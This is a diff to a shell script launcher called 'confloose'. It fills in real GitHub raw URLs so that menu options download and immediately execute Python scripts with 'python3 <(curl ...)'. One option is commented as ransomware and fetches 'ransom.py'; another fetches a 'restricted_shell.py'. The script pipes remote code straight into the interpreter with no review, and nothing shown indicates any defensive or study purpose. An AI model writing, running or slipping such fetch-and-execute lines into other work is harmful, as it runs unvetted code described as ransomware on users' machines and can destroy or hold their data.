@@ -17,10 +17,10 @@ function gui() {
 function confloose() {
     if [ "$1" == "0" ] || [ "$1" == "ransom" ] || [ "$1" == "-r" ]; then
         # ransomware
-        python3 <(curl url)
+        python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/src/ransom.py")
     elif [ "$1" == "1" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
         # restricted_shell
-        python3 <(curl url)
+        python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/src/restricted_shell.py")
     elif [ "$1" == "2" ]; then
         exit
     else
